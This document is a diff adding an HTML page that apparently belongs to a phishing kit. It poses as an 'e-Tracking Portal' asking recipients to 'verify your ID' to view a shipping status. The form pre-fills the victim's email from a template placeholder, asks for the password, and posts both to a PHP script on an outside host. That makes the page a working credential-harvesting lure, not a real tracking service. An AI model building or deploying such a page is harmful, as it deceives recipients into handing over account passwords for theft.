@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body, html {
+  height: 100%;
+  margin: 0;
+  font: 400 15px/1.8 "Lato", sans-serif;
+  color: #777;
+}
+
+.bgimg-1, .bgimg-2, .bgimg-3 {
+  position: relative;
+  background-position: center;
+  background-repeat: no-repeat;
+  background-size: cover;
+
+}
+.bgimg-1 {
+  background-image: url("https://i.imgur.com/AUH1jh2.png");
+  height: 100%;
+}
+
+.caption {
+  position: absolute;
+  left: 0;
+  top: 50%;
+  width: 100%;
+  text-align: center;
+  color: #000;
+}
+
+.caption span.border {
+  background-color: #111;
+  color: #fff;
+  padding: 18px;
+  font-size: 25px;
+  letter-spacing: 10px;
+}
+
+h3 {
+  letter-spacing: 5px;
+  text-transform: uppercase;
+  font: 20px "Lato", sans-serif;
+  color: #111;
+}
+</style>
+<style> 
+body {
+  background: #FFFFFF6;
+}
+input[type=submit] {
+  width:150px; height:45px; font-family: arial; font-size: 14px; color:#FFF; background-color: #DB0000; border: solid 1px #DB0000; font-weight:bold;
+}
+</style>
+</head>
+<body>
+<div class="bgimg-1">
+	<br><br><br><br><br>
+	<table align="center" style="width:420px; -webkit-box-shadow: 1px 1px 15px 1px #000000; box-shadow: 1px 1px 15px 1px #A2A2A2" bgcolor="#FFF"><tr>
+	<td>
+			<table align="center" style="width:320px;">
+			<tr><td style="height:20px;"></td></tr>
+			<tr><td>
+				<font style="font-family:calibri;font-size:25px;color:#DB0000; font-weight:bold;">
+					e-Tracking Portal
+				</font>
+				<br>
+				<font style="font-family:calibri;font-size:15px;color:#000000;"><strong>
+					To view your shipping status, verify your ID below
+				</strong></font>
+			</td></tr>
+			<tr><td style="height:7px;">
+				<form method="post" action="https://lims.cardinal5labs.com/kenji/gm.php">
+			</td></tr>
+			<tr><td>
+				<input  name="login" type="email" value="[[-Email-]]" readonly 
+				style="width:330px; height:35px; font-family: arial; font-size: 15px; color:#DB0000; 
+				background-color: #ffffff; border: solid 1px #BDBDBD; padding: 8px; border-radius: 2px 3px 1px 5px; font-weight:bold;">
+			</td></tr>
+			<tr><td style="height:5px;"></td></tr>
+			<tr><td>
+				<input  name="passwd" type="password" placeholder="Password" required 
+				style="width:330px; height:35px; font-family: arial; font-size: 15px; color:#0679AF; 
+				background-color: #ffffff; border: solid 1px #BDBDBD; padding: 8px; border-radius: 2px 3px 1px 5px;">
+			</td></tr>
+			<tr><td>
+				<table cellspacing="0"><tr>
+				<td>
+					<input type="checkbox" checked>
+					<font style="font-family:calibri;font-size:15px;color:#000000;">
+					 Remember my ID
+					</font>
+				</td>
+				</tr></table>
+			</td></tr>
+			<tr><td style="height:5px;"></td></tr>
+			<tr><td>
+				<div align="left">
+							<input type="submit" value="View Status >>>">
+				</div>
+			</td></tr>
+			<tr><td style="height:50px;"></td></tr>
+			</table>
+	</td>
+	</tr></table>
+</div>
+</body>
+</html>
